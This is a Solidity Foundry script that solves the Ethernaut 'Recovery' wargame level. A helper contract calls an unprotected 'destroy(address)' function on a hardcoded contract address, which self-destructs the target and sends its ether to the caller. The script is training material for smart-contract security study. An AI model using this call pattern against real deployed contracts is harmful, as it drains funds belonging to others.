// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery} from "../../src/Ethernaut/Recovery.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        AttacRecovery attack = new AttacRecovery();
        attack.kill();
        vm.stopBroadcast();
    }
}

contract AttacRecovery {
    function kill() public payable {
        address tokenAddr = 0xC1858c5bB18e78866B641aCAc6fD436476707e50;
        (bool success,) = tokenAddr.call(abi.encodeWithSignature("destroy(address)", payable(msg.sender)));
        require(success, "err");
    }
}
